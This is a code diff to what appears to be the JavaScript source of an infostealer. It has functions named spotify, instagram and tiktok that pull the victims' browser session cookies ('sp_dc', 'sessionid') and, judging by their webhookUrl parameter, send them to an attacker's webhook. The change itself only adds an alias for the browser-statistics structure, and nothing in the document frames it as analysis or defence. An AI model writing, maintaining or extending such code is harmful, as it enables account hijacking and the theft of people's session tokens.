@@ -6,8 +6,10 @@ const requests = require('./../../utils/requests/requests.js');
 const fileutil = require('./../../utils/fileutil/fileutil.js');
 const program = require('./../../utils/program/program.js');
 
+const BrowserStats = structures.BrowserStatistics;
+
 const spotify = async (webhookUrl) => {
-    const cookies = structures.BrowserStatistics.cookies.filter(cookie => 
+    const cookies = BrowserStats.cookies.filter(cookie => 
         cookie.host_key === '.spotify.com' && 
         cookie.name === 'sp_dc'
     );
@@ -114,7 +116,7 @@ const spotify = async (webhookUrl) => {
 };
 
 const instagram = async (webhookUrl) => {
-    const cookies = structures.BrowserStatistics.cookies.filter(cookie => 
+    const cookies = BrowserStats.cookies.filter(cookie => 
         cookie.host_key === '.instagram.com' && 
         cookie.name === 'sessionid'
     );
@@ -262,7 +264,7 @@ const instagram = async (webhookUrl) => {
 };
 
 const tiktok = async (webhookUrl) => {
-    const cookies = structures.BrowserStatistics.cookies.filter(cookie => 
+    const cookies = BrowserStats.cookies.filter(cookie => 
         cookie.host_key === '.tiktok.com' && 
         cookie.name === 'sessionid'
     );
